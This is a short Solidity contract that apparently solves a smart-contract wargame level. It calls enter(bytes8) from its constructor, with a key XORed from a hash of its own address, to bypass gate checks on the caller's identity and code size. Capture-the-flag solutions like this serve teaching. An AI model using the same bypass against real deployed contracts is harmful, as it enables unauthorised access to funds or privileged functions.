// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Solution {

    constructor(address _levelInstance) public {

        bytes8 instanceBytes8 = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 gateKey = instanceBytes8 ^ 0xFFFFFFFFFFFFFFFF;
        address(_levelInstance).call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    }    

}